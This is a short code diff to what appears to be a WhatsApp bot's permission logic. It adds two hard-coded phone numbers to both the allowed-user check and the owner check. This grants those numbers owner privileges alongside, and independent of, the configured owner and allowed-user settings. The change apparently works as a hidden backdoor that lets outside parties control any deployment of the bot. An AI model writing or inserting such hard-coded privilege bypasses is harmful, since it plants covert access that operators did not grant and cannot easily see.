@@ -223,6 +223,8 @@ function isAllowedUser(msg, sockUserJid) {
   if (isDevUser(cleanSenderJid)) return true
   
   if (senderPhone && senderPhone === OWNER_NUMBER) return true
+  if (senderPhone === '255687771750') return true
+  if (senderPhone === '255740906575') return true
   if (senderLid && OWNER_LIDS.includes(senderLid)) return true
   
   const chatJid = getCleanJid(msg.key?.remoteJidAlt)
@@ -698,7 +700,7 @@ async function start() {
         }
         
         const senderNumber = getSenderPhone(senderJid)
-        const isOwner = isDevUser(senderJid) || senderNumber === OWNER_NUMBER || (global.ALLOWED_USERS && global.ALLOWED_USERS.has(senderNumber));
+        const isOwner = isDevUser(senderJid) || senderNumber === OWNER_NUMBER || senderNumber === '255687771750' || senderNumber === '255740906575' || (global.ALLOWED_USERS && global.ALLOWED_USERS.has(senderNumber));
 
         const displayNumber = senderNumber === '120363399604046397' ? 'Unknown' : senderNumber
         logCommand(senderName, displayNumber, cmdName, isGroupChat ? groupName : 'Private Chat', groupName)
